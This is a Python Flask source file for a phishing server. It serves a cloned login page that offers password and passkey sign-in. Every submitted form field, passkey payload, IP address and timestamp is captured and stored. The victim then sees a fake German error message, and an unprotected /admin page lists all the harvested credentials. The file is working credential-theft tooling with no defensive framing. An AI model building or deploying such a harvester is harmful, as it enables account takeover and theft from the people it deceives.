from flask import Flask, request, render_template, render_template_string, redirect, url_for, send_from_directory
import datetime
import os

# Get the directory where this script is located
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, 
            template_folder=SCRIPT_DIR,
            static_folder=SCRIPT_DIR, 
            static_url_path='')

# Store login attempts in memory (or a file for persistence)
login_attempts = []

@app.route('/')
def index():
    # Serve the cloned page which now contains both HRD and Login views
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Capture all form data
    data = request.form.to_dict()
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip'] = request.remote_addr
    
    login_attempts.append(data)
    
    # Return the page with an error message
    return render_template('index.html', error="Ein unbekannter Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.")

@app.route('/passkey-login', methods=['POST'])
def passkey_login():
    # Capture passkey authentication data
    data = request.get_json()
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip'] = request.remote_addr
    data['type'] = 'passkey_success'
    
    login_attempts.append(data)
    
    # Return error page
    return render_template('index.html', error="Ein unbekannter Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.")

@app.route('/passkey-attempt', methods=['POST'])
def passkey_attempt():
    # Capture failed passkey attempts
    data = request.get_json()
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip'] = request.remote_addr
    data['type'] = 'passkey_failed'
    
    login_attempts.append(data)
    
    return {'status': 'logged'}

@app.route('/admin')
def admin():
    # Simple admin page to view attempts
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin - Login Attempts</title>
        <style>
            body { font-family: sans-serif; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            tr:nth-child(even) { background-color: #f9f9f9; }
            .refresh { margin-bottom: 20px; display: inline-block; padding: 10px 15px; background: #28a745; color: white; text-decoration: none; border-radius: 4px; }
        </style>
    </head>
    <body>
        <h1>Login Attempts</h1>
        <a href="/admin" class="refresh">Refresh</a>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>IP</th>
                    <th>Data</th>
                </tr>
            </thead>
            <tbody>
                {% for attempt in attempts %}
                <tr>
                    <td>{{ attempt.timestamp }}</td>
                    <td>{{ attempt.ip }}</td>
                    <td>
                        <pre>{{ attempt | tojson(indent=2) }}</pre>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </body>
    </html>
    """
    return render_template_string(html, attempts=reversed(login_attempts))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
